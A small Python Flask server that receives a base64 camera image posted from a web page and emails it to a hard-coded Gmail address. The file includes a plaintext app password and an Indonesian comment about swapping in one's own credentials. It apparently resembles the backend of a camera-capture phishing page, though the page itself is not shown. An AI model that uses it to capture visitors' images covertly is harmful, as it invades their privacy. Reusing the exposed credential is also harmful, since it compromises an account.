from flask import Flask, render_template, request, jsonify
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import base64

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/send_email', methods=['POST'])
def send_email():
    data = request.get_json()
    image_data = data['image']
    
    # Decode base64 image
    header, encoded = image_data.split(',', 1)
    image_bytes = base64.b64decode(encoded)

    # GANTI EMAIL & APP PASSWORD DI SINI!
    sender_email = "pyt02400@gmail.com"
    receiver_email = "pyt02400@gmail.com"
    password = "dqkf qzlb lfxl gpoa"

    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = "Hasil Kamera dari Website"

    part = MIMEBase('application', 'octet-stream')
    part.set_payload(image_bytes)
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment; filename="capture.png"')
    msg.attach(part)

    try:
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.login(sender_email, password)
        server.send_message(msg)
        server.quit()
        return jsonify({'message': '📸 Email berhasil dikirim!'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=3000)
